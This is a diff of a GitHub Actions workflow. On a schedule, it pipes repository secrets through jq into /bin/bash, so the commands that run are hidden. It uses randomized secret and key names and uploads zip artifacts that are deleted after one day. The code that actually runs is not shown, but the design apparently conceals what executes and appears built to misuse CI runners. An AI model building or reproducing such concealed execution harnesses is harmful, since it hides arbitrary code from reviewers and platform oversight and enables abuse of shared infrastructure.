@@ -1,32 +1,26 @@
 name: xinlvfajie
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '38 2/6 * * *'
-jobs:  # 16620
+    - cron: '42 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xinlvfajie
         env:
-          yy2: ${{ secrets.yy2 }}
+          rfcr93420: ${{ secrets.rfcr93420 }}
         run: |
-          echo $yy2 | jq -r .zg8848 | /bin/bash
-          echo $urncq2 | jq -r .x129 | /bin/bash
-          echo $igbjt32 | jq -r .um59265 | /bin/bash
-          echo $xmy74479 | jq -r .yiyu77 | /bin/bash
-          echo $qitef5 | jq -r .dxq007 | /bin/bash
-          echo $nh19 | jq -r .aysg75084 | /bin/bash
-          echo $dvxop5145 | jq -r .yz788 | /bin/bash
-          echo $fqd50 | jq -r .f97 | /bin/bash
-          echo $mak13 | jq -r .kyleg62 | /bin/bash
-          echo $cgcs327 | jq -r .o99 | /bin/bash
-          echo $tf7340 | jq -r .m93962 | /bin/bash
-          echo $dpga29 | jq -r .ui64 | /bin/bash
-          echo $wgvj5508 | jq -r .wy4 | /bin/bash
-          echo $dou2 | jq -r .klf88 | /bin/bash
-          echo $tpd50876 | jq -r .lq195 | /bin/bash
-          echo $kccqs8811 | jq -r .jfsad1100 | /bin/bash
+          printf '%s' "$rfcr93420" | jq -r .xoppo453 | /bin/bash
+          printf '%s' "$cx550" | jq -r .s011 | /bin/bash
+          printf '%s' "$pwlhz4741" | jq -r .b54497 | /bin/bash
+          printf '%s' "$jf57902" | jq -r .b5 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: EfVM4gJS
+          path: "*.zip"
+          retention-days: 1
